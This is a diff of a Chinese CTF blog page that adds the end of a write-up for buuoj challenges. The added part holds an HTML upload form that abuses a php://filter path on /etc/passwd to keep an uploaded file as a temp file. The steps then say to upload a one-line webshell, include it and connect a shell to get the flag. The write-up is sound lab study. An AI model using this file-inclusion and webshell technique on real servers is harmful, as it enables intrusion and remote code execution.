+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://22a3b9e5-eb32-4c8e-b130-54e4a5beb8df.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"filename"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上传一句话文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712111918.png" alt=""></p>
+<p>查看dir.php，我这试了两次</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712114122.png" alt=""></p>
+<p>查看文件是否包含成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712113629.png" alt=""></p>
+<p>包含文件连接shell查看即可，flag就在phpinfo里</p>
+<p><img src="C:%5CUsers%5C15363%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200712114003065.png" alt="image-20200712114003065"></p>
 
       
     </div>
@@ -457,7 +555,13 @@
       
         <div class="post-tags">
           
-            <a href="/tags/crypto/" rel="tag"><i class="fa fa-tag"></i> crypto</a>
+            <a href="/tags/bypass/" rel="tag"><i class="fa fa-tag"></i> bypass</a>
+          
+            <a href="/tags/serialize/" rel="tag"><i class="fa fa-tag"></i> serialize</a>
+          
+            <a href="/tags/xpath/" rel="tag"><i class="fa fa-tag"></i> xpath</a>
+          
+            <a href="/tags/hashpump/" rel="tag"><i class="fa fa-tag"></i> hashpump</a>
           
         </div>
       
@@ -470,8 +574,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/04/29/note10/" rel="next" title="二分法进行sql盲注">
-                <i class="fa fa-chevron-left"></i> 二分法进行sql盲注
+              <a href="/2020/07/10/python_serialize/" rel="next" title="python序列化和反序列化">
+                <i class="fa fa-chevron-left"></i> python序列化和反序列化
               </a>
             
           </div>
@@ -479,10 +583,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/05/23/note12/" rel="prev" title="PHP反序列化初总结">
-                PHP反序列化初总结 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -691,7 +791,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#最基本的求余"><span class="nav-number">1.</span> <span class="nav-text">最基本的求余</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#欧几里得算法"><span class="nav-number">2.</span> <span class="nav-text">欧几里得算法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#乘法逆元"><span class="nav-number">3.</span> <span class="nav-text">乘法逆元</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#拓展欧几里得算法"><span class="nav-number">4.</span> <span class="nav-text">拓展欧几里得算法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#费马小定理"><span class="nav-number">5.</span> <span class="nav-text">费马小定理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#欧拉函数"><span class="nav-number">6.</span> <span class="nav-text">欧拉函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#欧拉定理及推论"><span class="nav-number">7.</span> <span class="nav-text">欧拉定理及推论</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#ReadlezPHP"><span class="nav-number">1.</span> <span class="nav-text">ReadlezPHP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#解题"><span class="nav-number">1.1.</span> <span class="nav-text">解题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezlogin"><span class="nav-number">2.</span> <span class="nav-text">ezlogin</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#考点：xpath注入"><span class="nav-number">2.1.</span> <span class="nav-text">考点：xpath注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解题-1"><span class="nav-number">2.2.</span> <span class="nav-text">解题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezinclude"><span class="nav-number">3.</span> <span class="nav-text">ezinclude</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#考点1：哈希长度拓展攻击"><span class="nav-number">3.1.</span> <span class="nav-text">考点1：哈希长度拓展攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#考点2：临时文件包含（-php-7-Segment-Fault-）"><span class="nav-number">3.2.</span> <span class="nav-text">考点2：临时文件包含（ php 7 Segment Fault ）</span></a></li></ol></li></ol></div>
             
 
           </div>
